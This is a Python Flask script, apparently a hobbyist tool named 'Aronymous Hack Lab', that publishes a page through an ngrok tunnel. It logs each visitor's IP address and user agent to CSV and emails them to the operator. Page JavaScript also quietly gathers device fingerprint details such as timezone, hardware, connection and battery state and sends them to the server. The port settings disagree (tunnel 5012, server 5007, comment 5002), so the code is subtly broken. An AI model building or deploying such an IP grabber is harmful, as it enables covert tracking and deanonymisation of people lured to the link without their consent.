from flask import Flask, request, render_template_string, jsonify
from pyngrok import ngrok
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from datetime import datetime
import csv
import os

app = Flask(__name__)

# === CONFIGURACIÓN CORREO ===
aronymous_smtp_server = "smtp.gmail.com"
aronymous_smtp_port = 587
aronymous_email_origen = "tu_correo@gmail.com"  # <-- CAMBIA ESTO
aronymous_email_pass = "tu_contraseña_o_app_password"  # <-- CAMBIA ESTO
aronymous_email_destino = "destino_correo@gmail.com"  # <-- CAMBIA ESTO

aronymous_csv_file = "accesos.csv"
aronymous_extra_file = "extra_info.csv"

# === HTML CON JS PARA EXTRAER MÁS DATOS ===
HTML_PAGE = """
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8" />
    <title>Aronymous Hack Lab</title>
    <style>
        body {
            background-color: #000000;
            color: #39ff14;
            font-family: 'Courier New', Courier, monospace;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        h1 { font-size: 3em; text-shadow: 0 0 10px #39ff14; }
        p { font-size: 1.5em; text-shadow: 0 0 5px #39ff14; }
    </style>
    <script>
        async function enviarDatosExtra() {
            const battery = await navigator.getBattery();
            const data = {
                language: navigator.language,
                platform: navigator.platform,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                screen_resolution: window.screen.width + "x" + window.screen.height,
                user_agent: navigator.userAgent,
                cookies_enabled: navigator.cookieEnabled,
                device_memory: navigator.deviceMemory || "N/A",
                cpu_cores: navigator.hardwareConcurrency || "N/A",
                touch_support: 'ontouchstart' in window,
                connection_type: navigator.connection?.type || "N/A",
                battery_level: (battery.level * 100) + "%",
                battery_charging: battery.charging
            };

            fetch("/extra", {
                method: "POST",
                headers: {"Content-Type": "application/json"},
                body: JSON.stringify(data)
            });
        }
        window.onload = enviarDatosExtra;
    </script>
</head>
<body>
    <h1>Aronymous Hack Lab</h1>
    <p>Tu dirección IP ha sido capturada:</p>
    <p><strong>{{ ip }}</strong></p>
</body>
</html>
"""

# === FUNCIONES AUXILIARES ===
def aronymous_enviar_correo(ip, user_agent, fecha_hora):
    try:
        msg = MIMEMultipart()
        msg["From"] = aronymous_email_origen
        msg["To"] = aronymous_email_destino
        msg["Subject"] = "Nueva IP Capturada - Aronymous Hack Lab"

        cuerpo = (
            f"Acceso detectado en Aronymous Hack Lab\n\n"
            f"IP: {ip}\n"
            f"User-Agent: {user_agent}\n"
            f"Fecha y hora: {fecha_hora}\n"
        )
        msg.attach(MIMEText(cuerpo, "plain"))

        server = smtplib.SMTP(aronymous_smtp_server, aronymous_smtp_port)
        server.starttls()
        server.login(aronymous_email_origen, aronymous_email_pass)
        server.send_message(msg)
        server.quit()

        print(f"[+] Correo enviado con IP: {ip}")
    except Exception as e:
        print(f"[!] Error enviando correo: {e}")

def aronymous_guardar_en_csv(ip, user_agent, fecha_hora):
    file_exists = os.path.isfile(aronymous_csv_file)
    with open(aronymous_csv_file, mode="a", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(f, fieldnames=["IP", "User-Agent", "FechaHora"])
        if not file_exists:
            writer.writeheader()
        writer.writerow({"IP": ip, "User-Agent": user_agent, "FechaHora": fecha_hora})
    print(f"[+] Registro guardado en {aronymous_csv_file}")

# === RUTA PRINCIPAL ===
@app.route("/")
def index():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'N/A')
    fecha_hora = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    print(f"[{fecha_hora}] IP Capturada: {ip} - User-Agent: {user_agent}")

    aronymous_guardar_en_csv(ip, user_agent, fecha_hora)
    aronymous_enviar_correo(ip, user_agent, fecha_hora)

    return render_template_string(HTML_PAGE, ip=ip)

# === RUTA PARA RECIBIR DATOS EXTRAS CON JS ===
@app.route("/extra", methods=["POST"])
def recibir_datos_extra():
    data = request.json
    fecha_hora = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    file_exists = os.path.isfile(aronymous_extra_file)
    with open(aronymous_extra_file, mode="a", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(f, fieldnames=[
            "Idioma", "Plataforma", "ZonaHoraria", "Resolucion",
            "UserAgent", "Cookies", "RAM", "CPU_Cores", "Touch", "Conexion",
            "Bateria", "Cargando", "FechaHora"
        ])
        if not file_exists:
            writer.writeheader()
        writer.writerow({
            "Idioma": data.get("language", "N/A"),
            "Plataforma": data.get("platform", "N/A"),
            "ZonaHoraria": data.get("timezone", "N/A"),
            "Resolucion": data.get("screen_resolution", "N/A"),
            "UserAgent": data.get("user_agent", "N/A"),
            "Cookies": data.get("cookies_enabled", "N/A"),
            "RAM": data.get("device_memory", "N/A"),
            "CPU_Cores": data.get("cpu_cores", "N/A"),
            "Touch": data.get("touch_support", "N/A"),
            "Conexion": data.get("connection_type", "N/A"),
            "Bateria": data.get("battery_level", "N/A"),
            "Cargando": data.get("battery_charging", "N/A"),
            "FechaHora": fecha_hora
        })

    return jsonify({"status": "ok"})

# === EJECUTAR SERVIDOR + NGROK ===
if __name__ == "__main__":
    # Inicia el túnel de ngrok en el puerto 5002
    public_url = ngrok.connect(5012, bind_tls=True)
    print(f"[+] ngrok activo: {public_url}")

    # (Opcional) Enviar la URL pública por correo
    aronymous_enviar_correo("Túnel ngrok", str(public_url), datetime.now().strftime("%Y-%m-%d %H:%M:%S"))

    # Ejecutar Flask
    app.run(host="0.0.0.0", port=5007)
